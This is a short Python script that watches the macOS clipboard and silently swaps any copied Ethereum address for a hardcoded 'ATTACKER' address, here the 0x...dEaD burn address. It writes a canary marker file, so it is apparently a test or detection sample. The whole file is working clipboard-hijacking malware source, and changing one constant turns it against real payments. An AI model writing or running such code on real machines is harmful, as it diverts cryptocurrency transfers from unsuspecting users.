import re, subprocess, time
ATTACKER = "0x000000000000000000000000000000000000dEaD"
while True:
    clip = subprocess.run(["pbpaste"], capture_output=True, text=True).stdout
    if re.fullmatch(r"0x[a-fA-F0-9]{40}", clip.strip()) and clip.strip() != ATTACKER:
        subprocess.run(["pbcopy"], input=ATTACKER, text=True)
        open("/tmp/reinvently-canary-clipboard", "w").write("1")
    time.sleep(1)
